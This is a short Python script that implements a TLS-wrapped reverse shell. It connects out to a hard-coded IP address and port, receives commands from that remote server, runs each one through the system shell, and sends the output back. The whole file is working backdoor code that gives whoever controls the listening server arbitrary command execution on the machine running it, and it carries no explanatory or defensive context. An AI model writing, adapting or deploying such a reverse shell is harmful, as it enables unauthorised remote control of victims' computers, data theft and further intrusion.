# -*- coding = utf-8 -*-

import socket
import os
import ssl
import subprocess

#create a socket
def create_socket():
    try:
        global host
        global port
        global ssls
        host = '192.168.244.165'
        port = 8000
        s = socket.socket()
        ssls = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1) 
    except socket.error as msg:
        print('Socket create failed: ' + str(msg))

#connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        ssls.connect((host,port))
    except socket.error as msg:
        print("Socket connect failed" + str(msg))

#receive commands from remote server and run on local machine
def receive_command():
    global s
    while True:
        data = ssls.recv(1024)
        #change dir
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            #excute command
            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes)
            ssls.send(str.encode(output_str))
    s.close()

if __name__ == '__main__':
    create_socket()
    socket_connect()
    receive_command()
            
